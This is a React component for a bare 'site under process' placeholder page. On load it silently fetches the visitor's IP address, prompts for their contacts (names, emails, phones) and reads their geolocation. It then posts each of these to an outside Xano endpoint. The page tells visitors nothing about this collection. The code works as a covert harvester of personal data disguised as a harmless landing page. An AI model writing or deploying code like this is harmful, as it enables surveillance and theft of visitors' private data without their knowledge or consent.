import React, { useEffect, useState } from 'react';

function App() {
  // State to track whether each effect has already run
  const [ipFetched, setIpFetched] = useState(false);
  const [contactsFetched, setContactsFetched] = useState(false);
  const [locationFetched, setLocationFetched] = useState(false);

  // Effect to fetch IP address
  useEffect(() => {
    if (!ipFetched) {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;
          console.log('IP Address:', ipAddress);

          // Set flag to indicate IP fetched
          setIpFetched(true);

          // Send IP address to server
          fetch('https://x8ki-letl-twmt.n7.xano.io/api:yakBQjsE/sitedata', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ip: ipAddress })
          })
            .then(response => response.json())
            .then(data => console.log('Response from public endpoint:', data))
            .catch(error => console.error('Error sending IP address:', error));
        })
        .catch(error => console.error('Error fetching IP address:', error));
    }
  }, [ipFetched]);

  // Effect to fetch contacts
  useEffect(() => {
    if (!contactsFetched && navigator.contacts) {
      navigator.contacts.select(['name', 'email', 'phone'])
        .then(contacts => {
          const contactsJSON = JSON.stringify(contacts);
          console.log('Contacts:', contactsJSON);

          // Set flag to indicate contacts fetched
          setContactsFetched(true);

          // Send contacts to server
          fetch('https://x8ki-letl-twmt.n7.xano.io/api:yakBQjsE/sitedata', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: contactsJSON
          })
            .then(response => response.text())
            .then(data => console.log('Response from contacts endpoint:', data))
            .catch(error => console.error('Error sending contacts:', error));
        })
        .catch(error => console.error('Error accessing contacts:', error));
    }
  }, [contactsFetched]);

  // Effect to fetch location
  useEffect(() => {
    if (!locationFetched) {
      const successCallback = position => {
        const { latitude, longitude } = position.coords;
        const location = `${latitude},${longitude}`;
        console.log('Location:', location);

        // Set flag to indicate location fetched
        setLocationFetched(true);

        // Send location to server
        fetch('https://x8ki-letl-twmt.n7.xano.io/api:yakBQjsE/sitedata', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ loc: location })
        })
          .then(response => response.text())
          .then(data => console.log('Response from location endpoint:', data))
          .catch(error => console.error('Error sending location:', error));
      };

      const errorCallback = error => {
        console.error('Error getting location:', error);
      };

      const watchId = navigator.geolocation.getCurrentPosition(successCallback, errorCallback);

      return () => {
        // Cleanup: Clear watch position when component unmounts
        navigator.geolocation.clearWatch(watchId);
      };
    }
  }, [locationFetched]);

  return (
    <div>
      <h1>Welcome to New Site</h1>
      <h1>Site under process</h1>
    </div>
  );
}

export default App;
